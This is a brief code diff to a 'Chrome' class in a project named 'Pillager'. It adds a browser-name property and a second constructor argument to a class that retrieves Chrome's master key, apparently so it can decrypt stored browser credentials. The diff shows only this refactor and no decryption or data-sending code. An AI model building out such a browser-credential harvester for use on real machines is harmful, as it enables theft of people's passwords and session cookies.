@@ -11,10 +11,13 @@ namespace Pillager
     {
         private string BrowserPath { get; set; }
 
+        public string BrowserName { get; set; }
+
         private byte[] MasterKey { get; set; }
 
-        public Chrome(string Path)
+        public Chrome(string Name,string Path)
         {
+            BrowserName = Name;
             BrowserPath = Path;
             MasterKey = GetMasterKey();
         }
